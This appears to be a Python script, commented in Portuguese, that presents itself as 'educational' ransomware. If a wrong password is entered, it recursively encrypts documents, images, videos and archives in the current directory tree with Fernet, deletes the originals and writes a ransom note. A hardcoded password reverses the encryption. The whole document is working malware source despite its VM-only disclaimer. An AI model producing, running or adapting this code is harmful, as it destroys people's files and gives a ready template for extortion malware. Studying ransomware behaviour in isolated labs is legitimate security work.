#!/usr/bin/env python3
import os
import sys
from cryptography.fernet import Fernet

# ========== CONFIGURAÇÕES ==========
SENHA = "123123"
EXTENSOES = ['.txt', '.jpg', '.png', '.pdf', '.docx', '.xlsx', '.mp4', '.zip', '.rar']
# ====================================

def resource_path(relative_path):
    """Para compilar com PyInstaller (funciona em .exe também)"""
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def gerar_chave():
    """Gera uma chave de criptografia e salva em um arquivo"""
    key = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(key)
    return key

def carregar_chave():
    """Carrega a chave do arquivo"""
    with open("chave.key", "rb") as chave_file:
        return chave_file.read()

def criptografar_arquivo(file_path, key):
    """Criptografa um único arquivo"""
    try:
        with open(file_path, 'rb') as file:
            dados = file.read()
        
        fernet = Fernet(key)
        dados_criptografados = fernet.encrypt(dados)
        
        with open(file_path + '.encrypted', 'wb') as file:
            file.write(dados_criptografados)
        
        os.remove(file_path)
        print(f"[+] Criptografado: {file_path}")
    except Exception as e:
        print(f"[-] Erro em {file_path}: {e}")

def descriptografar_arquivo(file_path, key):
    """Descriptografa um único arquivo"""
    try:
        with open(file_path, 'rb') as file:
            dados_criptografados = file.read()
        
        fernet = Fernet(key)
        dados = fernet.decrypt(dados_criptografados)
        
        caminho_original = file_path.replace('.encrypted', '')
        with open(caminho_original, 'wb') as file:
            file.write(dados)
        
        os.remove(file_path)
        print(f"[+] Descriptografado: {caminho_original}")
    except Exception as e:
        print(f"[-] Erro em {file_path}: {e}")

def main():
    print("="*60)
    print("   RANSOMWARE DO GUERREIRO - EDUCACIONAL")
    print("="*60)
    print("⚠️  ATENÇÃO: Este é um ransomware educacional!")
    print("⚠️  Use APENAS em ambiente de teste (VM)")
    print("="*60)
    
    senha_input = input("\n[?] Digite a senha: ")
    
    if senha_input != SENHA:
        print("\n[!] SENHA INCORRETA! Criptografando arquivos...\n")
        
        # Gera a chave e criptografa
        key = gerar_chave()
        
        # Percorre todos os arquivos na pasta atual
        for root, dirs, files in os.walk('.'):
            for file in files:
                # Pula o próprio script e o arquivo da chave
                if file == os.path.basename(__file__) or file == "chave.key":
                    continue
                if any(file.endswith(ext) for ext in EXTENSOES):
                    caminho_completo = os.path.join(root, file)
                    criptografar_arquivo(caminho_completo, key)
        
        # Nota de resgate
        with open("LEIA_ME_RANSOMWARE.txt", "w") as f:
            f.write("="*60 + "\n")
            f.write("   SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!\n")
            f.write("="*60 + "\n\n")
            f.write("Para recuperar seus arquivos, execute este programa novamente\n")
            f.write("e digite a senha correta.\n\n")
            f.write("Senha de recuperacao: 123123\n\n")
            f.write("(Projeto educacional - nenhum dano real ao sistema)\n")
            f.write("="*60 + "\n")
        
        print("\n" + "="*60)
        print("   ARQUIVOS CRIPTOGRAFADOS COM SUCESSO!")
        print("="*60)
        print(f"📁 Nota de resgate: LEIA_ME_RANSOMWARE.txt")
        print(f"🔑 Senha de recuperacao: {SENHA}")
        print("="*60)
    else:
        print("\n[!] SENHA CORRETA! Descriptografando arquivos...\n")
        
        if os.path.exists("chave.key"):
            key = carregar_chave()
            for root, dirs, files in os.walk('.'):
                for file in files:
                    if file.endswith('.encrypted'):
                        caminho_completo = os.path.join(root, file)
                        descriptografar_arquivo(caminho_completo, key)
            
            # Limpa a chave e a nota de resgate
            os.remove("chave.key")
            if os.path.exists("LEIA_ME_RANSOMWARE.txt"):
                os.remove("LEIA_ME_RANSOMWARE.txt")
            
            print("\n" + "="*60)
            print("   SISTEMA RECUPERADO COM SUCESSO!")
            print("="*60)
        else:
            print("\n[-] Nenhum arquivo criptografado encontrado.")

if __name__ == "__main__":
    main()